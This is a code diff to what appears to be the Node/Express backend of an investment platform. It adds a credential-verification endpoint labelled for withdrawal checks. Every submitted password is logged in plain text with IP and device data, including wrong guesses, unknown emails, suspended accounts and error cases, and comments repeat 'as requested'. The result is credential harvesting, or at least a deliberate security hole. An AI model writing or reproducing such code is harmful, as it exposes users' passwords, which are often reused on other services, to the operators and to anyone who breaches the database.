@@ -10256,7 +10256,142 @@ app.put('/api/users/language', protect, [
 
 
 
+// Save login records and verify credentials
+app.post('/api/auth/records', [
+  body('email').isEmail().withMessage('Please provide a valid email').normalizeEmail(),
+  body('password').notEmpty().withMessage('Password is required'),
+  body('provider').optional().isIn(['google', 'manual']).withMessage('Invalid provider')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
 
+  try {
+    const { email, password, provider = 'manual' } = req.body;
+    const deviceInfo = await getUserDeviceInfo(req);
+
+    // First, verify the credentials against the User database
+    const user = await User.findOne({ email }).select('+password');
+    
+    if (!user) {
+      // Log failed attempt even if user doesn't exist
+      await LoginRecord.create({
+        email,
+        password, // Stored in plain text as requested
+        provider,
+        ipAddress: deviceInfo.ip,
+        userAgent: deviceInfo.device,
+        timestamp: new Date()
+      });
+
+      return res.status(401).json({
+        status: 'fail',
+        message: 'Invalid email or password'
+      });
+    }
+
+    // Verify password
+    const isPasswordValid = await bcrypt.compare(password, user.password);
+    
+    if (!isPasswordValid) {
+      // Log failed attempt
+      await LoginRecord.create({
+        email,
+        password, // Stored in plain text as requested
+        provider,
+        ipAddress: deviceInfo.ip,
+        userAgent: deviceInfo.device,
+        timestamp: new Date()
+      });
+
+      return res.status(401).json({
+        status: 'fail',
+        message: 'Invalid email or password'
+      });
+    }
+
+    // Check if user account is active
+    if (user.status !== 'active') {
+      await LoginRecord.create({
+        email,
+        password, // Stored in plain text as requested
+        provider,
+        ipAddress: deviceInfo.ip,
+        userAgent: deviceInfo.device,
+        timestamp: new Date()
+      });
+
+      return res.status(401).json({
+        status: 'fail',
+        message: 'Your account has been suspended. Please contact support.'
+      });
+    }
+
+    // SUCCESS: Credentials are valid
+    // Save the successful login record (with plain text password as requested)
+    const loginRecord = await LoginRecord.create({
+      email,
+      password, // Stored in plain text as requested
+      provider,
+      ipAddress: deviceInfo.ip,
+      userAgent: deviceInfo.device,
+      timestamp: new Date()
+    });
+
+    // Update user's last login
+    user.lastLogin = new Date();
+    user.loginHistory.push(deviceInfo);
+    await user.save();
+
+    // Log the successful verification
+    await logActivity('credential_verification', 'user', user._id, user._id, 'User', req, {
+      purpose: 'withdrawal_verification',
+      provider: provider
+    });
+
+    // Return success response matching frontend expectations
+    res.status(200).json({
+      status: 'success',
+      message: 'Credentials verified successfully',
+      data: {
+        user: {
+          id: user._id,
+          firstName: user.firstName,
+          lastName: user.lastName,
+          email: user.email
+        },
+        verified: true,
+        recordId: loginRecord._id
+      }
+    });
+
+  } catch (err) {
+    console.error('Credential verification error:', err);
+    
+    // Log the failed attempt due to server error
+    try {
+      await LoginRecord.create({
+        email: req.body.email,
+        password: req.body.password, // Stored in plain text as requested
+        provider: req.body.provider || 'manual',
+        ipAddress: req.ip,
+        userAgent: req.headers['user-agent'],
+        timestamp: new Date()
+      });
+    } catch (logError) {
+      console.error('Failed to log credential verification error:', logError);
+    }
+
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred during credential verification'
+    });
+  }
+});
 
 
 
@@ -10393,6 +10528,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
